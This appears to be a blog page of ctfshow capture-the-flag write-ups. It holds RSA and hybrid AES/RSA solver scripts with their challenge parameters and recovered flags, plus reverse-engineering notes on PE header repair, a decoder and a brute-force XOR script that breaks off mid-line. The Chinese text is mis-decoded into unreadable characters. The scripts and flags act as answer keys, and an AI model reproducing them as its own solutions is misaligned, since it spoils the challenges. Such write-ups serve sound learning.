JgAiIgAiIgAiIgNSSvgMiIAIiIAIiIAIi4I6A1JI7OmoTAREQAREQAREQAaklfQdEQAREQAREQAREwB0BqSV3dNQmAiIgAiIgAiIgAlJL+g6IgAiIgAiIgAiIgDsCUkvu6KhNBERABERABERABKSW9B0QAREQAREQAREQAXcEpJbc0VGbCIiACIiACIiACEgt6TsgAiIgAiIgAiIgAu4ISC25o6M2ERABERABERABEZBa0ndABERABERABERABNwRkFpyR0dtIiACIiACIiACIiC1pO+ACIiACIiACIiACLgjILXkjo7aREAEREAEREAEREBqSd8BERABERABERABEXBHQGrJHZ1q0TZu3LhqYaeMFAEREAEREIFqSkBqqZpeuJNmJyUlnTxQSQREQAREU80EGAAAEzFJREFUQARE4EwT8Ai1VFJSUliQX1BYXFJyYn0lxfn5eflFxSeO9V8REAEREAEREAEROD8ETkst5R3b9/uWIwWVsTz9wKa5xz9Ldx5MM9RQcX76+L898f7MzUXHhyrJ2rvkidtHPP7purzKDF6JvgWpW9esSco5eUbS7s1b9xw7YcDJ+oqWSkrSEvbs2ptUVCb4co7sWLU+Pvv4cLnxa387mn1ypExaN+7ILjxZo5IIiIAIiIAIiIDHEvA7HctSElZ/+s+tt7zyUK9GkT5OA+1a8vWXc3c4VPs0aNU1NqysMufIkfTGcbUC/Gx5CauXpwTe2bGZrzFKYe6qXzc27Dcye8ePK/e3uqhReFn/4sOblkz6fn6iw4h/PAyr13Lk6Otaxvj/sTpv+5zp28N6Xtm38fH63JyFU15N2nL/Q9cOiQoqrds6Z+JC32FXd9i+K2L4iPbR1OQdWPPBNzNTs06hBvuNeejS9nXon3VgyxdTl9QZevfDF7c4tn76v2dFj3vltsCco7Om/nfKMttdzzWLDYkqncmWt2zSf+b6D2vTplXZYe6iL9+Zv8si3Gy1+lx29cWdwxZ+/96KPWVdyvvhH9J16A1VV3jlDat6ERABERABERABC4HKqaWi7OStew6bpxcX1Gted+GPMxaHXNj8uFoKrtWkQb2wQF/6JO7YkV+r30O39Qw+cQIRN9/g8MiQgLKK4qIim91uK85NnPnDtBbXPN4lIiX+SGHjuLAjOxaui/e78eE789aO/2b8hAb339a8NorGp3arXjc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" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#sage</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">c= 48794779998818255539069127767619606491113391594501378173579539128476862598083</span><br><span class="line">hint= 7680157534215495795423318554486996424970862185001934572714615456147511225105</span><br><span class="line">e= 65537</span><br><span class="line">d= 45673813678816865674850575264609274229013439838298838024467777157494920800897</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phic=euler_phi(c)</span><br><span class="line"></span><br><span class="line">print(gcd(e,phic))</span><br><span class="line"></span><br><span class="line">dc=invert(e,phic)</span><br><span class="line"></span><br><span class="line">a=pow(hint,dc,c)</span><br><span class="line"></span><br><span class="line">n=int(a)+int(c)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(int(pow(c,d,n))))</span><br></pre></td></tr></table></figure><p>flagä¸ºctfshow{Oh_u_knOw_4uler}</p><h2 id="5-æ··åˆå¯†ç ä½“ç³»"><a href="#5-æ··åˆå¯†ç ä½“ç³»" class="headerlink" title="5 æ··åˆå¯†ç ä½“ç³»"></a><strong>5 æ··åˆå¯†ç ä½“ç³»</strong></h2><p>æ··åˆå¯†ç ä½“ç³»</p><p>AESåŠ å¯†æ˜æ–‡ï¼ŒRSAåŠ å¯†AESçš„å¯†é’¥</p><p>é¢˜ç›®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># åº“</span><br><span class="line">from Crypto.Util.number import bytes_to_long,getPrime</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line"></span><br><span class="line"># å¯¹ç§°åŠ å¯†</span><br><span class="line">flag = b&#x27;ctfshow&#123;***&#125;&#x27;      # å¯†æ–‡ï¼Œéšè—</span><br><span class="line">key = b&#x27;flag&#123;***&#125;&#x27;      # ä¼šè¯å¯†é’¥ï¼Œéšè—</span><br><span class="line">iv = b&#x27;flag&#123;1fake_flag&#125;&#x27;       # AESåç§»å‘é‡ï¼Œå·²çŸ¥</span><br><span class="line"># å¯¹æ˜æ–‡è¿›è¡Œå¡«å……ï¼Œä½¿å…¶é•¿åº¦ç¬¦åˆAESåŠ å¯†çš„è¦æ±‚</span><br><span class="line">padded_plaintext = pad(flag, AES.block_size)</span><br><span class="line"></span><br><span class="line"># åˆ›å»ºAESåŠ å¯†å¯¹è±¡</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"># åŠ å¯†</span><br><span class="line">ciphertext = cipher.encrypt(padded_plaintext)</span><br><span class="line"></span><br><span class="line"># åŠ å¯†åçš„æ–‡æœ¬é€šå¸¸æ˜¯å­—èŠ‚ä¸²ï¼Œè½¬æˆæ•´æ•°ä¾¿äºè¿›è¡Œä¼šè¯å¯†é’¥çš„RSAåŠ å¯†</span><br><span class="line">c1 = bytes_to_long(ciphertext)</span><br><span class="line"></span><br><span class="line">print(f&#x27;c1 = &#123;c1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># éå¯¹ç§°åŠ å¯†</span><br><span class="line">m = bytes_to_long(key)</span><br><span class="line">e = 0x10001</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line">n = p * q</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(f&#x27;p = &#123;p&#125;&#x27;)</span><br><span class="line">print(f&#x27;q = &#123;q&#125;&#x27;)</span><br><span class="line">print(f&#x27;n = &#123;n&#125;&#x27;)</span><br><span class="line">print(f&#x27;c2 = &#123;c&#125;&#x27;)</span><br><span class="line"># print(&quot;hint:keyéœ€è¦è½¬æˆå­—èŠ‚æµä¹Ÿå°±æ˜¯b&#x27;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">c1 = 10274623386006297478525964130173470046355982953419353351509177330015001060887455252482567718546651504491658563014875</span><br><span class="line">p = 126682770761631193509957156425049279522830651950325320826580754739365086374362604934854454428815835196844469535588686149210573266628767888593088817059600076401582225549728184309047483547810100015820325082976781284679340880386138390518973395696206374336712856387090369022746536868747455939074262253452873845903</span><br><span class="line">q = 99825079362327808334563489684167271427241139432727401182808888165552821217781929397837262324242177528386988701584385208395369790542025175917752058047649096340776854252623173162664426065810683048016574420043010318337693586527652970534982946701493024718805916479479658257730226388868060010370893747360166996939</span><br><span class="line">n = 12646117645119414744807511144503229609414192869007113075368323921021672404219693075011763838210400633721060798765473421092201704833591315689681668160927426685183273670665030724394172000165517517884654100267567861284096827407481978978840602383267875832034344793848710383473014512122260278131503985961857107838296047172582364612603344429943715046318283653354068887129071531081918798285138812386418361474496678248683513378861801570673376726388110813411011818940310547686977359605296489433805717348250520973842927175837164120905300831792358190183785344002217291207378744610039145999012939983693891188308725179098958690917</span><br><span class="line">c2 = 5211902378262010726785508340196935051860438587769647187076059600864676774592415052428465708887047312982844957691943180258845015420187239772414768121857728821510440178906193308448250067671679439841031484589864038401572589752057423667532898133171822921282769652197139455317095891357335645435094243006629469245881345449943250189771998449015275390517315432969774421721243965028796050948747282387052634211032729131656214346307483397410725129682422969273915759947596313513270946529649661334582775282060624547405060499311618257517792321792697831000977711752728887999320311631022598717946355057272761740061999974856808147244</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># åº“</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line"></span><br><span class="line">c1 = 10274623386006297478525964130173470046355982953419353351509177330015001060887455252482567718546651504491658563014875</span><br><span class="line">p = 126682770761631193509957156425049279522830651950325320826580754739365086374362604934854454428815835196844469535588686149210573266628767888593088817059600076401582225549728184309047483547810100015820325082976781284679340880386138390518973395696206374336712856387090369022746536868747455939074262253452873845903</span><br><span class="line">q = 99825079362327808334563489684167271427241139432727401182808888165552821217781929397837262324242177528386988701584385208395369790542025175917752058047649096340776854252623173162664426065810683048016574420043010318337693586527652970534982946701493024718805916479479658257730226388868060010370893747360166996939</span><br><span class="line">n = 12646117645119414744807511144503229609414192869007113075368323921021672404219693075011763838210400633721060798765473421092201704833591315689681668160927426685183273670665030724394172000165517517884654100267567861284096827407481978978840602383267875832034344793848710383473014512122260278131503985961857107838296047172582364612603344429943715046318283653354068887129071531081918798285138812386418361474496678248683513378861801570673376726388110813411011818940310547686977359605296489433805717348250520973842927175837164120905300831792358190183785344002217291207378744610039145999012939983693891188308725179098958690917</span><br><span class="line">c2 = 5211902378262010726785508340196935051860438587769647187076059600864676774592415052428465708887047312982844957691943180258845015420187239772414768121857728821510440178906193308448250067671679439841031484589864038401572589752057423667532898133171822921282769652197139455317095891357335645435094243006629469245881345449943250189771998449015275390517315432969774421721243965028796050948747282387052634211032729131656214346307483397410725129682422969273915759947596313513270946529649661334582775282060624547405060499311618257517792321792697831000977711752728887999320311631022598717946355057272761740061999974856808147244</span><br><span class="line">e = 0x10001</span><br><span class="line">iv = b&#x27;flag&#123;1fake_flag&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># éå¯¹ç§°è§£å¯†</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = pow(c2, d, n)</span><br><span class="line"></span><br><span class="line">key = long_to_bytes(m)</span><br><span class="line">print(key) # flag&#123;**********&#125;</span><br><span class="line"># å¯¹ç§°è§£å¯†</span><br><span class="line">ciphertext = long_to_bytes(c1)</span><br><span class="line"></span><br><span class="line"># åˆ›å»ºAESè§£å¯†å¯¹è±¡</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"># è§£å¯†</span><br><span class="line">plaintext_padded = cipher.decrypt(ciphertext)</span><br><span class="line">print(plaintext_padded)</span><br><span class="line"></span><br><span class="line"># å»é™¤å¡«å……,æ²¡æœ‰è¿™ä¸€æ­¥ä¹Ÿèƒ½å¾—åˆ°flag</span><br><span class="line">flag = unpad(plaintext_padded, AES.block_size)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag</p><p>ctfshow{Hybrid_password_system_is_chaos}</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h3><p>éé¢„æœŸï¼šæ‰“å¼€IDA</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240708171017813.png" alt="image-20240708171017813"><br>ä¸è¿‡éƒ½è€ƒPEä¿®å¤äº†ï¼Œå­¦ä¸€å­¦</p><p>ï¼š<a href="http://t.csdnimg.cn/14ygR">http://t.csdnimg.cn/14ygR</a></p><p>æ–‡ä»¶å¤´ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00</span><br><span class="line">B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 F8 00 00 00</span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯è¿™ä¸ªï¼š<img src="https://img-blog.csdnimg.cn/20201213104311755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NsYzExMTI=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ä¸€ä¸ªè¥¿ç“œåˆ‡ä¸¤åŠä½ ä¸€åŠæˆ‘ä¸€åŠ"><a href="#ä¸€ä¸ªè¥¿ç“œåˆ‡ä¸¤åŠä½ ä¸€åŠæˆ‘ä¸€åŠ" class="headerlink" title="ä¸€ä¸ªè¥¿ç“œåˆ‡ä¸¤åŠä½ ä¸€åŠæˆ‘ä¸€åŠ"></a>ä¸€ä¸ªè¥¿ç“œåˆ‡ä¸¤åŠä½ ä¸€åŠæˆ‘ä¸€åŠ</h3><p>æ²¡æƒ³åˆ°keyæ˜¯â€ ä¸€ä¸ªè¥¿ç“œåˆ‡ä¸¤åŠä½ ä¸€åŠæˆ‘ä¸€åŠâ€œæ„£æ„£ç”¨ä¹‹å‰çš„keyï¼Œæ€ªä¸å¾—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: GBK -*-</span></span><br><span class="line"></span><br><span class="line">crypt = <span class="string">&quot;ä¹ƒä¹¾è§…ç”¯å‰ä¹³å¡ä¾»ä¸¨åæ‰ä¹Œåšä¸¿ä¹œè§„ç”²å‰Œä¹¶åä¾¥ä¸¿å»æ‰šä¸ å˜ä¸¿ä¹è¦Ÿç“¬å‰¤&quot;</span></span><br><span class="line">key = <span class="string">&quot;ä¸€ä¸ªè¥¿ç“œåˆ‡ä¸¤åŠä½ ä¸€åŠæˆ‘ä¸€åŠ&quot;</span></span><br><span class="line">tmp = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(crypt)):</span><br><span class="line">    tmp += <span class="built_in">chr</span>((<span class="built_in">ord</span>(crypt[i]) - <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">0x110000</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h3><p>?æš´åŠ›ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">CTF=<span class="string">&#x27;ctfshow&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decript</span>(<span class="params">L,n,password,k</span>):</span><br><span class="line">    T=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        j=i%k</span><br><span class="line">        T.append(L[i]^(<span class="number">0xff</span>-password[j]))</span><br><span class="line">    res=<span class="built_in">bytes</span>(T)</span><br><span class="line">    <span class="keyword">return</span> CTF <span class="keyword">in</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute</span>(<span class="params">fname</span>):</span><br><span class="line">    f=<span class="built_in">open</span>(fname,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    exe=f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    offset=<span class="number">0x2040</span></span><br><span class="line">    n=<span class="number">622</span></span><br><span class="line">    code=exe[offset:offset+n]</span><br><span class="line">    L=<span class="built_in">list</span>(code)</span><br><span class="line">    charset=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0x41</span>,<span class="number">0x41</span>+<span class="number">26</span>))+<span 